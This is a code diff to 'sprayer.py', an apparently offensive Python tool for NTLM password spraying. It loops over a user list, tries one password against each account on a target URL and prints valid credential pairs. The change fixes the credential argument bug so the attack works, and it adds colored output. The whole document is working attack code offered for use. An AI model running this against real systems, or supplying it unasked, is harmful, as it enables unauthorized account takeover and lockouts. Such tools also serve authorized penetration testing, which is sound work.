@@ -2,6 +2,10 @@ import requests
 import requests_ntlm
 import sys
 import getopt
+from termcolor import colored
+import os
+
+os.system('color')
 
 userfile = ''
 fqdn = ''
@@ -11,7 +15,7 @@ attackurl = ''
 def usage():
     print("Usage: sprayer.py -u USERS_FILE -f DC_FQDN -p PASSWORD -a URL_TO_ATTACK")
     print("Example: ")
-    print("sprayer.py -u users.txt -f dc.mydomain.com -p password1234 -a http://authForm.mydomain.com/")
+    print("sprayer.py -u users.txt -f mydomain.local -p password1234 -a http://authForm.mydomain.local/")
     sys.exit(0)
 
 def startSpray(userfile, fqdn, password, attackurl):
@@ -26,13 +30,13 @@ def startSpray(userfile, fqdn, password, attackurl):
     count = 0
     
     for user in users:
-        response = requests.get(attackurl, auth=requests_ntlm.HttpNtlmAuth(fqdn + "\\" + user + password))
+        response = requests.get(attackurl, auth=requests_ntlm.HttpNtlmAuth(fqdn + "\\" + user, password))
         if(response.status_code == HTTP_AUTH_SUCCESS_CODE):
-            print("[+] Valid credential pair found! Username: " + user + " Password: " + password)
+            print(colored("[+] Valid credential pair found! Username: " + user + " Password: " + password, "green"))
             count += 1
             continue
         if(response.status_code == HTTP_AUTH_FAIL_CODE):
-            print("[-] Failed login with Username: " +user)
+            print(colored("[-] Failed login with Username: " +user, "red"))
     print("[*] Password spray attack completed, " +str(count)+ " valid credential pairs found")
 
 def main(argv):
@@ -50,9 +54,7 @@ def main(argv):
     try:
         opts, args = getopt.getopt(sys.argv[1:], "h:u:f:p:a:", 
                                                 ["help", "userfile=", "fqdn=", "password=", "attackurl="])
-       
         for option, arg in opts:
-            
             if option in ("-h", "--help"):
                 usage()
             elif option in ("-u", "--userfile"):
